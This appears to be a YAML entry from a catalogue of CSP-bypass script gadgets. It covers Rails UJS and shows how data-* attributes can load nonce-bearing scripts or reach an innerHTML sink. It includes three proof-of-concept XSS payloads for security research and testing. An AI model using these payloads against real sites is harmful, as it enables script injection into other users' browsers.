---
description: Ruby on Rails unobtrusive scripting adapter.
github: rails/rails/blob/main/actionview/app/assets/javascripts/rails-ujs.js
gadgets:
  Latest:
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - a-tag
      - data-attr
      - href-attr
      - nonce-csp
      - any-timing
    pocs:
      - description: |
          Rails [UJS](https://github.com/rails/rails/blob/main/actionview/app/assets/javascripts/rails-ujs.js) allows loading JavaScript files using `data-*` attributes. Furthermore, if a nonce is found using the selector [meta[name="csp-nonce"]](https://github.com/rails/rails/blob/3b8d4da1417c808758402e821811a2f41769f860/actionview/app/assets/javascripts/rails-ujs.js#L26C45-L26C65), it will automatically be added to the `<script>` tag. Since the event is delegated to the document, it can be triggered at any time.
          
          For this to works the server must respond with `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Headers: *` and `Content-Type: application/javascript`.
        code: |
          <meta name="csp-nonce" content="secret">
          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/@rails/ujs@7.1.3-4/app/assets/javascripts/rails-ujs.min.js"></script>

          <!-- user input -->
          <a data-remote="true" data-method="get" data-type="script" href="[current-location]/assets/xss/index.js">XSS</a>
      - description: An alternative payload that uses fewer attributes works by abusing the `data-method` attribute, which ends in an [innerHTML sink](https://github.com/rails/rails/blob/3b8d4da1417c808758402e821811a2f41769f860/actionview/app/assets/javascripts/rails-ujs.js#L414) (this one won't work without an `unsafe-inline` CSP directive).
        code: |
          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/@rails/ujs@7.1.3-4/app/assets/javascripts/rails-ujs.min.js"></script>

          <!-- user input -->
          <a data-method="'><img src=x onerror=alert(1)>'" href="[current-location]/assets/xss/index.js">XSS</a>
      - description: Another interesting way to abuse this gadget (highlighted by [@ryotkak](https://x.com/ryotkak)) is by copy-pasting the payload into a [contenteditable](https://developer.mozilla.org/fr/docs/Web/HTML/Reference/Global_attributes/contenteditable) element.
        code: |
          <meta name="csp-nonce" content="secret">
          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/@rails/ujs@7.1.3-4/app/assets/javascripts/rails-ujs.min.js"></script>

          <!-- past the payload here -->
          <div contenteditable="true"></div>
    more-info: |
      The full list of available `data-*` attributes is:
      - data-confirm
      - data-method
      - data-remote
      - data-disable
      - data-disable-with
      - data-url
      - data-params
      - data-with-credentials
      - data-type
      - data-turbo
      - data-disabled
    links:
      - https://github.com/rails/rails/issues/42164
      - https://gitlab.com/gitlab-org/gitlab/-/issues/213273
      - https://gitlab.com/gitlab-org/gitlab/-/issues/336138
      - https://blog.ryotak.net/post/dom-based-race-condition/
---
